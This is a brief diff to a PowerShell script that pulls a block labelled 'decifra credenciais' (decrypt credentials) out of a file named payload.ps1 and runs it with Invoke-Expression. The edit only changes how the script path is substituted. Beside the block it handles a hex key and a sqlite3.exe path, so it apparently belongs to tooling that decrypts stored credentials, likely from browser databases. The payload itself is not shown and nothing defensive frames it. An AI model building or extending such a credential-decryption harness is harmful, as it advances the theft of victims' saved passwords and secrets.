@@ -4,7 +4,7 @@ $src = Join-Path $PSScriptRoot 'payload.ps1'
 $all = Get-Content -LiteralPath $src -Raw
 $m = [regex]::Match($all, '(?s)# --- decifra credenciais.*?\$sqlite = Join-Path \$PSScriptRoot ''sqlite3\.exe''')
 if (-not $m.Success) { throw 'bloco de decifragem nao encontrado' }
-Invoke-Expression $m.Value
+Invoke-Expression ($m.Value.Replace('$PSScriptRoot', "'" + $PSScriptRoot + "'"))
 
 $k = Hex-ToBytes $KeyHex
 if ($LsPath) {
